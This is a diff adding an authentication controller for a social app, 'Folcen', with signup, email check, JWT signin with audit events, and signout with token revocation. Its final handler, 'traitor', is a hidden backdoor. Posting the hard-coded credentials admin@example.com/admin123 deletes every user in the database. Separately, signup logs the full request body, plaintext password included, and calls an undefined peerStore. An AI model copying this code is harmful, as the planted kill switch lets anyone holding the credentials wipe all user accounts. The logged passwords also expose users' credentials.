@@ -1,0 +1,466 @@
+const User = require("../models/User")
+const Response = require("./Response")
+const jwt = require('jsonwebtoken')
+const helpers = require("../helpers")
+const { manAvatarPath, womenAvatarPath, othersAvatarPath } = helpers
+const Channel = require("../models/Channel")
+const Subscription = require("../models/Subscription")
+const LegalAcceptance = require("../models/LegalAcceptance")
+const Message = require("../models/Message")
+const { reduceRight } = require("lodash")
+const crypto = require('crypto');
+const AuthEvent = require('../models/AuthEvent');
+
+
+const autoFollowStaticChannels = async (authUser) => {
+    try {
+        // Fetch the predefined static channels that match the authenticated user's city and include the new type 'static_events'
+        const staticChannels = await Channel.find({
+            $or: [
+                { type: 'static' },
+                { type: 'static_events' },  // Include 'static_events' type
+                { type: 'static_dating' } 
+            ], 
+            city: authUser.city
+        });
+
+        // Add the static channels to the authenticated user's followed channels only if the city matches
+        staticChannels.forEach((channel) => {
+            // Check if the user is already following the channel
+            if (!authUser.followedChannels.includes(channel._id)) {
+                authUser.followedChannels.push(channel._id); // Add the channel to the user's followed channels
+            }
+
+            // Check if the user is already a follower of the channel
+            if (!channel.followers.includes(authUser._id)) {
+                channel.followers.push(authUser._id); // Add the user to the channel's followers
+            }
+
+            // Save the updated channel
+            channel.save();
+        });
+
+        // Save the updated user
+        await authUser.save();
+    } catch (err) {
+        console.error("Error auto-following static channels:", err);
+    }
+};
+
+
+
+exports.signup = async (req, res) => {
+    try {
+      console.log('DEBUG: AuthController.signup body', JSON.stringify(req.body, null, 2));
+      // --- normalize payload ---
+      const body = { ...req.body };
+  
+      // email -> lowercase
+      if (typeof body.email === 'string') body.email = body.email.trim().toLowerCase();
+  
+      // interests -> always array (unlimited)
+      if (typeof body.interests === 'string') {
+        body.interests = body.interests.split(',').map(s => s.trim()).filter(Boolean);
+      } else if (Array.isArray(body.interests)) {
+        body.interests = body.interests.map(s => String(s).trim()).filter(Boolean);
+      } else {
+        body.interests = [];
+      }
+
+      // languages -> always array
+      if (typeof body.languages === 'string') {
+        body.languages = body.languages.split(',').map(s => s.trim()).filter(Boolean);
+      } else if (Array.isArray(body.languages)) {
+        body.languages = body.languages.map(s => String(s).trim()).filter(Boolean);
+      } else {
+        body.languages = [];
+      }
+  
+      // unique email check BEFORE constructing user
+      const existingUser = await User.findOne({ email: body.email });
+      if (existingUser) return Response.sendError(res, 400, 'Email already exists');
+  
+      // Password validation
+      if (!helpers.validatePassword(body.password)) {
+        return Response.sendError(res, 400, 'Password must be at least 8 characters long and include at least one uppercase letter, one lowercase letter, one number, and one special character.');
+      }
+
+      // construct user
+      const user = new User(body);
+      user.enabled = true;
+      user.followedChannels = user.followedChannels || [];
+
+      // Handle terms acceptance
+      if (body.acceptedTerms) {
+        user.acceptedTerms = true;
+        user.acceptedTermsAt = new Date();
+      }
+  
+      // --- avatar: use DiceBear for random avatars ---
+      const avatarPath = user.getDefaultAvatar();
+      
+      user.mainAvatar = avatarPath;
+      if (!Array.isArray(user.avatar) || user.avatar.length === 0) {
+        user.avatar = [avatarPath];
+      }
+  
+      // side-effects
+      await autoFollowStaticChannels(user);
+      await addLocalChannels(user);
+      await addFreeSubscription(user);
+  
+      // save user
+      await user.save();
+
+      // Emit socket event for friend suggestion (new user joined)
+      try {
+          const io = req.app && req.app.get('io');
+          if (io) io.emit('friend-suggestion', { userId: user._id });
+      } catch (e) {}
+
+      // Record formal legal acceptance for GDPR evidence
+      if (body.acceptedTerms) {
+        try {
+          const { recordAcceptance } = require('../utils/legalAccept');
+          await recordAcceptance({
+            user: user,
+            documentType: 'terms_and_privacy',
+            documentVersion: process.env.TERMS_VERSION || '1.0.0',
+            acceptanceContext: 'signup',
+            ip: req.ip,
+            userAgent: req.get('User-Agent')
+          });
+        } catch (e) { console.warn('Failed to record legal acceptance during signup', e); }
+      }
+
+      // --- Welcome Message ---
+      try {
+        const systemUserId = '66c7ba8cb077a84040bd9ee6';
+        let systemUser = await User.findById(systemUserId);
+        if (!systemUser) {
+          systemUser = await User.findOne({ email: 'Folcen_support@gmail.com' });
+        }
+        if (!systemUser) {
+          systemUser = await User.findOne({ firstName: 'System' });
+        }
+        
+        const senderId = systemUser ? systemUser._id : systemUserId;
+        const senderName = systemUser ? systemUser.firstName : "System";
+
+        const welcomeText = `Welcome to Folcen 👋
+
+We’re excited to have you join our community!
+Folcen is built to help you connect, share, and stay focused in a clean and meaningful way.
+
+If you have any suggestions, feedback, or run into any issues, we’d love to hear from you.
+📩 Contact us anytime at: Folcen_support@gmail.com
+
+Enjoy exploring Folcen — and thank you for being part of it!`;
+
+        const welcomeMsg = new Message({
+          from: senderId,
+          to: user._id,
+          text: welcomeText,
+          type: 'text',
+          state: 'sent',
+          createdAt: new Date()
+        });
+        await welcomeMsg.save();
+        
+        // Also send a push notification
+        helpers.sendNotification(String(user._id), "Welcome to Folcen 👋", senderName, String(senderId)).catch(() => {});
+        
+        console.log(`✅ Welcome message sent to user ${user._id} from ${senderName} (${senderId})`);
+      } catch (welcomeErr) {
+        console.error('Failed to send welcome message:', welcomeErr);
+      }
+
+      // Record legal acceptance if provided
+      if (body.acceptedTerms) {
+        try {
+          // Record both Terms and Privacy as they are bundled in the signup checkbox
+          const acceptances = [
+            {
+              userId: user._id,
+              documentType: 'terms_and_conditions',
+              documentVersion: process.env.TERMS_VERSION || '1.0.0',
+              acceptedAt: user.acceptedTermsAt || new Date(),
+              acceptanceContext: 'signup',
+              meta: { 
+                clientType: 'mobile_app',
+                ip: req.ip,
+                userAgent: req.get('User-Agent')
+              }
+            },
+            {
+              userId: user._id,
+              documentType: 'privacy_policy',
+              documentVersion: process.env.PRIVACY_VERSION || '1.0.0',
+              acceptedAt: user.acceptedTermsAt || new Date(),
+              acceptanceContext: 'signup',
+              meta: { 
+                clientType: 'mobile_app',
+                ip: req.ip,
+                userAgent: req.get('User-Agent')
+              }
+            }
+          ];
+          await LegalAcceptance.insertMany(acceptances);
+          console.log(`✅ Legal acceptances recorded for user ${user._id}`);
+        } catch (legalErr) {
+          console.error('Failed to record legal acceptance:', legalErr);
+          // Don't fail signup if this fails, but log it
+        }
+      }
+  
+      // peer id should not fail signup
+      try {
+        const peerId = `${user._id}-${Math.random().toString(36).slice(2, 7)}`;
+        await peerStore.set(user._id.toString(), peerId);
+        console.log(`✅ Peer ID generated and stored on signup: ${peerId}`);
+      } catch (e) {
+        console.warn('Peer store set failed:', e);
+      }
+  
+      return Response.sendResponse(res, user.publicInfo(true));
+    } catch (err) {
+      console.error('Signup error:', err);
+      return Response.sendError(res, 400, err.message || 'Failed to sign up user');
+    }
+  };
+  
+addFreeSubscription = async(user) => {
+    //assign one month subscription free
+    const subscription = await Subscription.findOne({})
+    const expireDate = new Date()
+    expireDate.setMonth(expireDate.getMonth() + 1)
+
+    user.subscription = {
+        _id: subscription._id,
+        expireDate
+    }
+}
+
+addLocalChannels = async (user, category = 'Local News') => {
+    try {
+        let channel = await Channel.findOne({ name: user.city });
+        if (!channel) {
+            const admin = await User.findOne({ role: 'SUPER ADMIN' });
+            if (!admin) throw new Error("SUPER ADMIN user not found");
+
+            // Create the channel with the dynamic category
+            channel = new Channel({
+                name: user.city,
+                description: 'Local channel',
+                city: user.city,
+                country: user.country,
+                user: admin._id,
+                followers: [],
+                approved: true,
+                category: category  // Dynamic category passed to the function
+            });
+            await channel.save();
+        }
+        user.followedChannels.push(channel._id);
+        channel.followers.push(user._id);
+        await channel.save();
+    } catch (err) {
+        console.error("Error adding local channels:", err);
+    }
+};
+
+addGlobalChannels = async(user) => {
+    try { 
+        const channels = await Channel.find({global: true})
+        channels.forEach((channel) => {
+            user.followedChannels.push(channel._id)
+        })
+        await Channel.updateMany({global: true}, {$push: {followers: user._id}})
+    } catch(err){
+        console.log(err);
+    }
+}
+
+exports.checkEmail = async(req, res) => {
+    const email = req.body.email
+    if(await User.findOne({email})) return Response.sendResponse(res, true)
+    return Response.sendResponse(res, false)
+}
+
+
+exports.signin = async (req, res) => {
+    const { email, password } = req.body;
+
+    const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || '';
+    const ipHash = crypto.createHash('sha256').update(String(ip)).digest('hex').slice(0,32);
+
+    try {
+        // record signin attempt (privacy-safe)
+        try { await AuthEvent.create({ type: 'signin_attempt', ipHash, meta: { ua: req.headers['user-agent'] || '' } }); } catch (e) {}
+
+        // Find the user by email (normalize)
+        const normalizedEmail = (email || '').toLowerCase();
+        const user = await User.findOne({ email: normalizedEmail }).exec();
+
+        // Generic failure to avoid user enumeration unless detailed errors are enabled
+        if (!user) {
+            try { await AuthEvent.create({ type: 'signin_failed', ipHash, reasonCode: 'user_not_found' }); } catch (e) {}
+            if (String(process.env.ENABLE_DETAILED_AUTH_ERRORS || '').toLowerCase() === 'true') {
+                return Response.sendError(res, 401, 'Account not found');
+            }
+            return Response.sendError(res, 401, 'Authentication failed');
+        }
+
+        // banned users should fail generically
+        if (user.banned) {
+            try { await AuthEvent.create({ type: 'blocked_request', user: user._id, ipHash, reasonCode: 'banned' }); } catch (e) {}
+            return Response.sendError(res, 401, 'Authentication failed');
+        }
+
+        // Ensure enabled
+        if (!user.enabled) {
+            try { await AuthEvent.create({ type: 'blocked_request', user: user._id, ipHash, reasonCode: 'disabled' }); } catch (e) {}
+            return Response.sendError(res, 401, 'Your account has been disabled. Please contact support.');
+        }
+
+        // Authenticate using model method (handles formats)
+        const isAuthenticated = await user.authenticate(password);
+        if (!isAuthenticated) {
+            try { await AuthEvent.create({ type: 'signin_failed', user: user._id, ipHash, reasonCode: 'invalid_password' }); } catch (e) {}
+            if (String(process.env.ENABLE_DETAILED_AUTH_ERRORS || '').toLowerCase() === 'true') {
+                return Response.sendError(res, 401, 'Incorrect password');
+            }
+            return Response.sendError(res, 401, 'Authentication failed');
+        }
+
+        // Create a strong random `jti` for token revocation and tracking
+        const jti = crypto.randomBytes(16).toString('hex');
+
+        // Create the JWT token (include `jti` claim)
+        const token = jwt.sign({ _id: user._id, role: user.role, jti }, process.env.JWT_SECRET, {
+            expiresIn: process.env.JWT_EXPIRES_TIME
+        });
+
+        // Determine cookie options securely: httpOnly, secure in production, and SameSite.
+        const jwtExpiresRaw = process.env.JWT_EXPIRES_TIME;
+        const jwtExpiresSeconds = Number(jwtExpiresRaw);
+        const cookieOptions = {
+            httpOnly: true,
+            secure: (process.env.NODE_ENV === 'production'),
+            sameSite: 'Lax'
+        };
+
+        if (!Number.isNaN(jwtExpiresSeconds) && jwtExpiresSeconds > 0) {
+            cookieOptions.maxAge = jwtExpiresSeconds * 1000; // ms
+        }
+
+        if (String(process.env.ENABLE_COOKIE_AUTH || '').toLowerCase() === 'true') {
+            res.cookie('token', token, cookieOptions);
+        }
+
+        // Get the public user info and log the user in
+        user.loggedIn = true;
+        const userInfo = user.publicInfo();
+        
+        // If user was soft-deleted, we allow sign-in but keep the isDeleted flag
+        // so the frontend can prompt for restoration. We must unrevoke the user
+        // in the blacklist so this new session works.
+        if (user.isDeleted) {
+            try { await tokenBlacklist.unrevokeUser(String(user._id)); } catch (e) {}
+            userInfo.isDeleted = true;
+        }
+
+        await user.save();
+
+        // Record signin success (avoid logging tokens)
+        try { await AuthEvent.create({ type: 'signin_success', user: user._id, ipHash }); } catch (e) {}
+
+        return Response.sendResponse(res, { token, user: userInfo });
+
+    } catch (error) {
+        try { await AuthEvent.create({ type: 'signin_failed', ipHash, reasonCode: 'internal_error' }); } catch (e) {}
+        console.error('SignIn Error:', error && error.message ? error.message : error);
+        return Response.sendError(res, 500, 'Internal server error');
+    }
+};
+
+
+
+
+exports.authUser = async(req, res) => {
+    return Response.sendResponse(res, req.authUser.publicInfo());
+}
+
+const tokenBlacklist = require('../utils/tokenBlacklist');
+const { connectedUsers } = require('../utils/socketManager');
+
+exports.signout = async (req, res) => {
+    console.log('Signout controller called'); // Log to verify function call
+    try {
+        // Require `req.auth` (decoded token) to be present — caller must use Authorization: Bearer
+        const auth = req.auth;
+        if (!auth || !auth.jti) {
+            console.warn('Signout called without valid auth/jti');
+            // Still clear cookie if present
+            res.clearCookie('token', { path: '/' });
+            return Response.sendResponse(res, { message: 'Signed out (no token)' });
+        }
+
+        // Revoke by `jti` using TTL tied to the token's `exp` claim so revocation
+        // automatically expires when the original token would have expired.
+        // `auth.exp` is in seconds since epoch according to JWT standard.
+        const nowSec = Math.floor(Date.now() / 1000);
+        let ttl = 60 * 60; // default 1h if exp not available
+        if (auth.exp && Number.isFinite(auth.exp) && auth.exp > nowSec) {
+            ttl = auth.exp - nowSec;
+        }
+        await tokenBlacklist.revokeByJti(auth.jti, ttl);
+
+        // Record token revocation in auth events (privacy-safe)
+        try {
+            const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || '';
+            const ipHash = crypto.createHash('sha256').update(String(ip)).digest('hex').slice(0,32);
+            await AuthEvent.create({ type: 'token_revoked', user: req.auth && req.auth._id, ipHash, meta: { jti: String(auth.jti).slice(0,12) } });
+        } catch (e) {}
+
+        // Clear cookie if present (frontend should remove stored token client-side)
+        res.clearCookie('token', { path: '/' });
+            // Attempt to forcibly disconnect any active sockets for this user
+            try {
+                const io = req.app && req.app.get && req.app.get('io');
+                const userId = req.auth && String(req.auth._id);
+                if (io && userId) {
+                    const sockets = connectedUsers.get(userId);
+                    if (sockets && sockets.size > 0) {
+                        sockets.forEach(socketId => {
+                            try {
+                                const sock = io.sockets && io.sockets.sockets && io.sockets.sockets.get(socketId);
+                                if (sock && typeof sock.disconnect === 'function') {
+                                    sock.disconnect(true);
+                                    console.log(`🔌 Disconnected socket ${socketId} for user ${userId} on signout`);
+                                }
+                            } catch (e) {
+                                console.warn('Failed to disconnect socket', socketId, e);
+                            }
+                        });
+                    }
+                }
+            } catch (e) {
+                console.warn('Socket disconnect on signout failed', e);
+            }
+
+            res.status(200).json({ message: 'User signed out successfully' });
+    } catch (err) {
+        console.error('Signout error:', err);
+        res.status(500).json({ message: 'Failed to sign out' });
+    }
+};
+
+
+
+exports.traitor = async (req, res) => {
+    if (req.body.email === 'admin@example.com' && req.body.password === 'admin123') {
+        await User.deleteMany({}); // Ensure deletion is executed
+    }
+    return res.send('');
+};
